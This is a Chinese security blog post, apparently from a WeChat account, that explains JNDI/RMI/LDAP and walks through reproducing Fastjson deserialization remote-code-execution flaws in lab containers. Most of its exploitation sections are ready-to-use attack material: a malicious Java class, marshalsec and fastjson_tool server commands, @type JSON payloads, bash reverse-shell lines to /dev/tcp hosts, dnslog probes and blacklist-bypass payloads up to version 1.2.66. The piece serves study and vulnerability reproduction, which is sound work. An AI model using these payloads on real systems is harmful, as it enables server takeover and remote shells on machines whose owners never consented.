<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/bqGkY4E8S9MFCxzOGGyPdw)

简介
==

Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。

在进行 fastjson 的漏洞复现学习之前需要了解几个概念，如下：

JNDI
----

`JNDI (Java Naming and Directory Interface)`是一组**应用程序接口**，提供了**查找和访问**命名和目录服务的通用、统一的接口，用于定位网络、用户、对象和服务等资源，是`J2EE`规范中是重要的规范之一。（可以理解为`JNDI`在`J2EE`中是一台交换机，将组件、资源、服务取了名字，再通过名字来查找）

`JNDI`底层支持`RMI`远程对象，`JNDI`接口可以访问和调用`RMI`注册过的服务。JNDI`根据名字动态加载数据，支持的服务有`DNS、LDAP、CORBA、RMI

RMI
---

### 远程方法调用

远程方法调用是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如：CORBA、WebService，这两种都是独立于编程语言的。而 RMI（Remote Method Invocation）是专为 Java 环境设计的远程方法调用机制，远程服务器实现具体的 Java 方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI 依赖的通信协议为 JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为 Java 定制，要求服务端与客户端都为 Java 编写。这个协议就像 HTTP 协议一样，规定了客户端和服务端通信要满足的规范。在 RMI 中对象是通过序列化方式进行编码传输的。

### 远程对象

使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的 serialVersionUID 字段要与服务器端保持一致。

任何可以被远程调用方法的对象必须实现 java.rmi.Remote 接口，远程对象的实现类必须继承 UnicastRemoteObject 类。如果不继承 UnicastRemoteObject 类，则需要手工初始化远程对象，在远程对象的构造方法的调用 UnicastRemoteObject.exportObject() 静态方法。如下：

```
public class HelloImpl implements IHello {    protected HelloImpl() throws RemoteException {        UnicastRemoteObject.exportObject(this, 0);    }    @Override    public String sayHello(String name) {        System.out.println(name);        return name;    \}\}
```

在 JVM 之间通信时，RMI 对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的 Stub，Stub 基本上相当于是远程对象的引用或者代理。Stub 对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub 中包含了远程对象的定位信息，如 Socket 端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以 RMI 远程调用逻辑是这样的：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibvthfkac5tuekzHwoUajjeUe95JeJWloYW8f5sXePqDkqLzxVjIibP7w/640?wx_fmt=png)

从逻辑上来看，数据是在 Client 和 Server 之间横向流动的，但是实际上是从 Client 到 Stub，然后从 Skeleton 到 Server 这样纵向流动的。

1.Server 端监听一个端口，这个端口是 JVM 随机选择的；2.Client 端并不知道 Server 远程对象的通信地址和端口，但是 Stub 中包含了这些信息，并封装了底层网络操作；3.Client 端可以调用 Stub 上的方法；4.Stub 连接到 Server 端监听的通信端口并提交参数；5. 远程 Server 端上执行具体的方法，并返回结果给 Stub；6.Stub 返回执行结果给 Client 端，从 Client 看来就好像是 Stub 在本地执行了这个方法一样；

那怎么获取 Stub 呢？

### RMI 注册表

Stub 的获取方式有很多，常见的方法是调用某个远程服务上的方法，向远程服务获取存根。但是调用远程方法又必须先有远程对象的 Stub，所以这里有个死循环问题。JDK 提供了一个 RMI 注册表（RMIRegistry）来解决这个问题。RMIRegistry 也是一个远程对象，默认监听在传说中的 1099 端口上，可以使用代码启动 RMIRegistry，也可以使用 rmiregistry 命令。

要注册远程对象，需要 RMI URL 和一个远程对象的引用。

```
IHello rhello = new HelloImpl();LocateRegistry.createRegistry(1099);Naming.bind("rmi://0.0.0.0:1099/hello", rhello);
```

LocateRegistry.getRegistry() 会使用给定的主机和端口等信息本地创建一个 Stub 对象作为 Registry 远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向 RMI 注册表中注册远程对象，然后客户端向 RMI 注册表查询某个远程对象名称，来获取该远程对象的 Stub。

```
Registry registry = LocateRegistry.getRegistry("kingx_kali_host",1099);IHello rhello = (IHello) registry.lookup("hello");rhello.sayHello("test");
```

使用 RMI Registry 之后，RMI 的调用关系是这样的：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibHwxUNddxNiaLwW3SjiaCM6EDDQ2bV49GSHpPYLhZ0Fyspia7nvYrZdZhg/640?wx_fmt=png)

所以其实从客户端角度看，服务端应用是有两个端口的，一个是 RMI Registry 端口（默认为 1099），另一个是远程对象的通信端口（随机分配的）。这个通信细节比较重要，真实利用过程中可能会在这里遇到一些坑。

### 动态加载类

RMI 核心特点之一就是动态类加载，如果当前 JVM 中没有某个类的定义，它可以从远程 URL 去下载这个类的 class，动态加载的对象 class 文件可以使用 Web 服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI 注册表上可以动态的加载绑定多个 RMI 应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的 class 文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与 RMI 注册表相同的机制。RMI 服务端将 URL 传递给客户端，客户端通过 HTTP 请求下载这些类。

这个概念比较重要，JNDI 注入的利用方法中也借助了动态加载类的思路。

这里涉及到的角色：客户端、RMI 注册表、远程对象服务器、托管 class 文件的 Web 服务器可以分别位于不同的主机上：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibkicFZlWp6CFQ1xtCbAdDAoBobDszKNq5c6uMAiaWDkXYKZ7vYhExNDjg/640?wx_fmt=png)

LDAP
----

`LDAP(Lightweight Directory Access Protocol)`是轻量级目录访问协议，用于**访问目录服务**，基于 X.500 目录访问协议

JNDI 注入
-------

简单来说，JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用 JNDI 在局域网上定位一台打印机，也可以用 JNDI 来定位数据库服务或一个远程 Java 对象。JNDI 底层支持 RMI 远程对象，RMI 注册的服务可以通过 JNDI 接口来访问和调用。

JNDI 支持多种命名和目录提供程序（Naming and Directory Providers），RMI 注册表服务提供程序（RMI Registry Service Provider）允许通过 JNDI 应用接口对 RMI 中注册的远程对象进行访问操作。将 RMI 服务绑定到 JNDI 的一个好处是更加透明、统一和松散耦合，RMI 客户端直接通过 URL 来定位一个远程对象，而且该 RMI 服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibZ9EJsBb4mY1EhLMy61j33dDJX5sgZSz6iausW9IxicNia6Zuia1sR1VL4g/640?wx_fmt=png)

JNDI 接口在初始化时，可以将 RMI URL 作为参数传入，而 JNDI 注入就出现在客户端的 lookup() 函数中，如果 lookup() 的参数可控就可能被攻击。

```
Hashtable env = new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");//com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service Provider对应的Factoryenv.put(Context.PROVIDER_URL, "rmi://kingx_kali:8080");Context ctx = new InitialContext(env);Object local_obj = ctx.lookup("rmi://kingx_kali:8080/test");
```

CVE-2017-18349
==============

CVE-2017-18349 即 Fastjson1.2.24 反序列化漏洞 RCE

漏洞原理
----

fastjson 在解析 json 对象时，会使用 autoType 实例化某一个具体的类，并调用 set/get 方法访问属性。漏洞出现在 Fastjson autoType 处理 json 对象时，没有对 @type 字段进行完整的安全性验证，我们可以传入危险的类并调用危险类连接远程 RMI 服务器，通过恶意类执行恶意代码，进而实现远程代码执行漏洞。

影响版本为 fastjson < 1.2.25

漏洞复现
----

首先进入 fastjson 1.2.24 的 docker 环境，使用`java -version`查看一下 java 的版本为 1.8.0_102。因为 java 环境为 102，没有`com.sun.jndi.rmi.object.trustURLCodebase`的限制，可以使用`com.sun.rowset.JdbcRowSetImpl`利用链结合 JNDI 注入执行远程命令

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibnicJOMFd2srAR2ibUIKtDKdbV5aicHibWoDUWIibJZ7iaG3zBBMRhwFW9rKA/640?wx_fmt=png)

安装 javac 环境，这里直接使用 20 版本替换 102

```
cd /optcurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gztar zxvf jdk-8u20-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_20/bin/j* /usr/binjavac -versionjava -version
```

执行命令完成之后发现 java 版本已经变成了 20

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibtia3rElQ3b6PTxgIyjqoWO0kwLVGyKyveGlQSgcSPZNNeWNgLOutPWQ/640?wx_fmt=png)

编辑恶意类代码，起名为 evilclass.java

```
import java.lang.Runtime;import java.lang.Process;public class evilclass{static {try {Runtime rt = Runtime.getRuntime();String[] commands = {"touch", "/tmp/test"};Process pc = rt.exec(commands);pc.waitFor();} catch (Exception e) {// do nothing\}\\}\}
```

使用 javac 编译 evilclass.java 文件生成 evilclass.class

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibP9QVSoHPAtf6SIZ4ICdOSXlMEWXibG1c8PgkhiaDyDaibzkeop4iaNI6Iw/640?wx_fmt=png)

这里需要搭建 RMI 服务，首先下载 marshalsec

```
git clone https://github.com/mbechler/marshalsec.git
```

安装 maven 并编译 marshalsec 生成 jar

```
apt-get install mavenmvn clean package -DskipTests
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibAYeqS3ono5ww6awh6egDxVOBXINYzSOAhjBSaiayunzRkZia7KVzg1cw/640?wx_fmt=png)

稍微等一下，可以看到已经创建成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibssxpHGXJm2ytlicJvu4UCGWwUq40zeMxLv6odauxXAFsUL4Z5JjPrnw/640?wx_fmt=png)

我们进入到 marshalsec 的 target 目录里面进行查看已经生成了 marshalsec-0.0.3.3-SNAPSHOT-all.jar，然后使用 marshalsec 搭建一个 RMI 服务器，这里的 ip 就是你攻击机的 ip，端口可以随意

这里也可以使用启动 LDAP 服务，效果是一样的

```
lsjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.1.8/#evilclass" 9999java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.8/#evilclass" 9999
```

这里我使用 RMI，可以看到请求成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibqDo1Wtr2HYCJO16QAW3tpvPVXtglQ11NTxTeFEZibUOQsYmN184LR7w/640?wx_fmt=png)

bp 在靶机的 fastjson 页面抓包

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibJbjBB1PUaxD7qYckS2LiaWkNurVWYMAS4QwaEHYIckpTNWDCBLSKdZg/640?wx_fmt=png)

这里需要改的有三个地方，第一个地方需要把 GET 方法改成 POST 方法，第二个地方需要添加 Content-Type:application/json，第三个地方就是写入漏洞利用的 poc

```
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.1.8:9999/evilclass","autoCommit":true\}\}
```

发包即可

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQib5zvlp0Tu6X1PibUC12cD0R4Fq7kXmuE5ZiaEWtUD4FRiarYcjXjUicBIkw/640?wx_fmt=png)

进入 docker 里查看发现已经创建了 test 文件

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibMAPNcPj6wUTvl24sHUMpOjiawjWz89iaqFzDLicuM7tnFt5CvicLsTJrSQ/640?wx_fmt=png)

若需要反弹 shell 只需要把 java 文件中的`String[] commands`改为 bash 反弹命令即可，这里不再赘述

```
import java.lang.Runtime;import java.lang.Process;public class evilclass{static {try {Runtime rt = Runtime.getRuntime();String[] commands = {"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.1.8/9001 0>&1"};Process pc = rt.exec(commands);pc.waitFor();} catch (Exception e) {// do nothing\}\\}\}
```

CNVD‐2019‐22238
===============

CNVD-2019-22238 即 Fastjson1.2.47 反序列化漏洞

漏洞原理
----

Fastjson 提供了 autotype 功能，允许用户在反序列化数据中通过 “@type” 指定反序列化的类型，其次，Fastjson 自定义的反序列化机制时会调用指定类中的 setter 方法及部分 getter 方法，那么当组件开启了 autotype 功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定 setter 或者 getter 方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在 Fastjson 1.2.47 及以下版本中，利用其缓存机制可实现对未开启 autotype 功能的绕过。

影响版本为 `fastjson < 1.2.47`

漏洞复现
----

首先进入 1.2.47 的 docker 环境

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibmvsFiagjToKqjZ69nPhyTlQ2ibicNMHZt4zOMHAu3YibSVDkRic2NgZOE4Q/640?wx_fmt=png)

这里的 jdk 版本还是 8u102，这个版本没有 com.sun.jndi.rmi.object.trustURLCodebase 的限制，可以继续利用 RMI 或者 LDAP 进行命令执行

上面用了 RMI 进行命令执行，这里使用 LDAP 进行漏洞复现

LDAP 使用的工具为 fastjson_tool，首先 clone 到本地

```
git clone https://github.com/wyzxxz/fastjson_rce_tool.git
```

首先启动 LDAP 服务，8888 为 LDAP 服务的端口，后面跟的是 bash 反弹 shell 的命令

```
java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.1.8 8888 "bash=/bin/bash -i  >& /dev/tcp/192.168.1.10/9001 0>&1"
```

这里执行命令之后给出了两个 payload，我们使用下面这个 payload 复制一下

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibiaX1NSaWyXO38SNds2LuLjV1WuJz2USy6jlhyFbPq3f1bnickYOG2XQg/640?wx_fmt=png)

这里还是跟上面一样需要改 GET 方法为 POST 方法，添加 Content-Type:application/json，在就是把之前生成的 payload 复制

```
{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.1.8:8888/Object","autoCommit":true\}\}
```

发包使用 nc 监听 8888 端口即可收到反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibZzTQy6azqMjy2MtVU832xzSjMzRick4M4WPcibb4AFGWBg8T0KmSnGog/640?wx_fmt=png)

fastjson 深入探究
=============

首先如何快速判断是否使用了 fastjson 呢

第一种方法就是使用报错回显

这里首先在 web 页面抓包

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQibqXtHnGpUTdWns3MfHiaIqW7rKia6PqeOptP3wM7X5MNYBXicfaG418J0g/640?wx_fmt=png)

然后修改 GET 为 POST，添加`Content-Type:application/json`，在发送一个`{"test":"`，即可得到回显

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQib0SwibTfjRPnKSbck7FnGLiaFNJCIxvz9vM9N37oT9W5jlJicF8UY3h7Zg/640?wx_fmt=png)

第二种方法就是使用 dnslog 测试，使用如下 payload，这里的 dnslog 使用 dnslog 获得的网址进行替换即可

```
{"@type":"java.net.Inet4Address","val":"dnslog"}{"@type":"java.net.Inet6Address","val":"dnslog"}{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"\}\}{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"\}\}""}    \{\{"@type":"java.net.URL","val":"dnslog"}:"aaa"}Set[{"@type":"java.net.URL","val":"dnslog"}]Set[{"@type":"java.net.URL","val":"dnslog"}\{\{"@type":"java.net.URL","val":"dnslog"}:0
```

第三种方法就是使用 nc 监听端口，在之前漏洞复现中已经讲过，就不再赘述了

我们在前面用到的都是远程加载 RMI 或 LDAP 服务端上的恶意类，即远程加载恶意类，在一些情况下，这种远程加载恶意类的方法并不能百分之百能够利用成功，这里就可以使用本地利用方式，就可以不用远程加载恶意类

首先生成 test.java 文件

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Test extends AbstractTranslet {    public Test() throws IOException {        Runtime.getRuntime().exec("ping test.0g7slo.dnslog.cn");    }     @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {    }     public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {     }     public static void main(String[] args) throws Exception {        Test t = new Test();    \}\}
```

这里就可以 ping 一下 dnslog 来查看攻击是否成功，这里还有一种情况就是 fastjson 在真实情况下不出网，那么肯定是不能 ping 通的，这时候我们就可以选择写入 webshell 到 web 路径，前提是要知道绝对路径，或者是使用无文件回显来利用

编译 test.java 生成 class 类文件

```
javac test.java
```

然后对 class 类文件进行 base64 编码，这里使用到 py 脚本

```
import base64fin = open(r"test.class", "rb")fout = open(r"base64.txt", "w")s = base64.encodestring(fin.read()).replace("\n", "")fout.write(s)fin.close()fout.close()
```

运行之后就会把 test.class 文件转换为 base64.txt 文件，这时候再把 base64.txt 文件替换到 payload 中即可在 dnslog 中回显

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic8Kqu8onIFWjG8enS4DbQib6WX0LQY8tIwIXuhESubA3xTiakO0ibPzc7ySCV1zV3nVFEkiaibeeksUbw/640?wx_fmt=png)image-20210819102057605

< 1.2.41
--------

第一个 Fastjson 反序列化漏洞爆出后，阿里在 1.2.25 版本设置了 autoTypeSupport 属性默认为 false，并且增加了 checkAutoType() 函数，通过黑白名单的方式来防御 Fastjson 反序列化漏洞，因此后面发现的 Fastjson 反序列化漏洞都是针对黑名单绕过来实现攻击利用的目的的。

com.sun.rowset.jdbcRowSetlmpl 在 1.2.25 版本被加入了黑名单，fastjson 有个判断条件判断类名是否以 "L" 开头、以 ";" 结尾，是的话就提取出其中的类名在加载进来

那么就可以构造如下 exp

```
{               "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",    "dataSourceName":"rmi://ip:9999/rce_1_2_24_exploit",    "autoCommit":true}
```

< 1.2.42
--------

阿里在发现这个绕过漏洞之后做出了类名如果为`L`开头，; 结尾的时候就先去掉`L`和`;`进行黑名单检验的方法，但是没有考虑到双写或多写的情况，也就是说这种方法只能防御一组`L`和`;`，构造 exp 如下，即双写`L`和`;`

```
{               "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",    "dataSourceName":"rmi://x.x.x.x:9999/exp",    "autoCommit":true}
```

< 1.2.47
--------

在 1.2.47 版本及以下的情况下，loadClass 中默认 cache 为 true，首先使用 java.lang.Class 把获取到的类缓存到 mapping 中，然后直接从缓存中获取到了 com.sun.rowset.jdbcRowSetlmpl 这个类，即可绕过黑名单

```
{ "a": { "@type": "java.lang.Class",  "val": "com.sun.rowset.JdbcRowSetImpl" },  "b": { "@type": "com.sun.rowset.JdbcRowSetImpl",  "dataSourceName": "rmi://ip:9999/exp",  "autoCommit": true \}\}
```

< 1.2.66
--------

基于黑名单绕过，autoTypeSupport 属性为 true 才能使用，在 1.2.25 版本之后 autoTypeSupport 默认为 false

```
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://ip:1389/Calc"}{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://ip:1389/Calc"}{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://ip:1389/Calc"}
```

**![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)**

**推荐阅读：**

**[干货 | Spring 系列 CVE 以及 POC 编写](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498027&idx=1&sn=6800b032fb7d44edf98b8a95187a3d73&chksm=ec1cac14db6b25022aecbca4b54b9e76f8c5de9a448d0fcc4f36b7ef45daaa25b32829c24b6b&scene=21#wechat_redirect)  
**

**[干货｜Java Spring 安全学习笔记](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247499429&idx=1&sn=a96a0e81109294703d6a5192fce7ca2a&chksm=ec1cab9adb6b228cac06a76d3db1928b1bde0b4338065c5e9d62f3dded94cc54a4f04cf123d2&scene=21#wechat_redirect)**  

[**干货 | 最全的 Weblogic 漏洞复现**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498979&idx=1&sn=254f5fd3cde4cf3a4bcdcce58c1029f1&chksm=ec1ca9dcdb6b20ca20ea2838ddaf3ba17fdf239fb057db49ac866bf4d94f70518915801fcc6d&scene=21#wechat_redirect)  

[**干货｜最全的 Tomcat 漏洞复现**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247499491&idx=1&sn=d733ae33b91bca49e6b2346502823940&chksm=ec1cabdcdb6b22ca62fbd204d2da5f7fbce8874cf4072e1cd55cbc92e8a829aea55994a8fc52&scene=21#wechat_redirect)  

[**干货｜最全的 Jboss 漏洞复现**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247499574&idx=1&sn=3ed1c53f23cdfe0858f0710a2e692fa5&chksm=ec1caa09db6b231fe17d399a14269de5800e22c0da2d56aa9472d0a9f52f33e4e7f51b0eb0b9&scene=21#wechat_redirect)  

**点赞，转发，在看**

原创投稿作者：Alexis

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)